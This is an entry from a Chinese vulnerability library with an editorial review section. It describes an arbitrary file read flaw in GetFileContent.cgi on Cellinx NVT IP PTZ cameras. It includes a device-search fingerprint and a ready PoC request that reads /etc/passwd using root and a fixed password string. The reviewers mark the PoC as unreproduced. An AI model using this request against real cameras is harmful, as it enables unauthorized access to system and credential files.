---
source: "wy876 漏洞文库"
id: "vw-10ecec2d97796fc476e17a5a"
entity_id: "ve-10ecec2d97796fc476e17a5a"
schema_version: "1"
fofa_unverified: "web.body="
title: "Cellinx NVT 摄像机 GetFileContent.cgi 任意文件读取漏洞"
product: "Cellinx NVT IP PTZ摄像机"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "正文v1.0.6.002b；请求显式USER=root及PWD长值，来源与鉴权未解释"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/Cellinx/CellinxNVT%E6%91%84%E5%83%8F%E6%9C%BAGetFileContent.cgi%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/hy0qp46w1tuklewg"
source_status: "recorded"
---

# Cellinx NVT 摄像机 GetFileContent.cgi 任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Cellinx NVT IP PTZ摄像机
- 本文讨论：GetFileContent.cgi任意文件读取
- 版本、权限与配置前提：正文v1.0.6.002b；请求显式USER=root及PWD长值，来源与鉴权未解释
- 资料类型：短PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 摄像机误归网络设备，宜转智能设备/IOT
- frontmatter把hunter web.body截断为fofa
- 影响版本节遗漏正文具体版本
- 携带固定凭据但未说明认证要求；无结果证据
- 已落实的文本修订：残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- PWD是否默认凭据/固定加密串及版本适用性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
Cellinx NVT IP PTZ是韩国Cellinx公司的一个摄像机设备。Cellinx NVT v1.0.6.002b版本存在安全漏洞，该漏洞源于存在本地文件泄露漏洞，攻击者可读取系统密码等敏感信息。

# 二、影响版本
+ Cellinx NVT 摄像机 

# 三、资产测绘
+ hunter`web.body="local/NVT-string.js"`
+ 特征


# 四、漏洞复现
```plain
/cgi-bin/GetFileContent.cgi?USER=root&PWD=D1D1D1D1D1D1D1D1D1D1D1D1A2A2B0A1D1D1D1D1D1D1D1D1D1D1D1D1D1D1B8D1&PATH=/etc/passwd&_=1672577046605
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hy0qp46w1tuklewg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
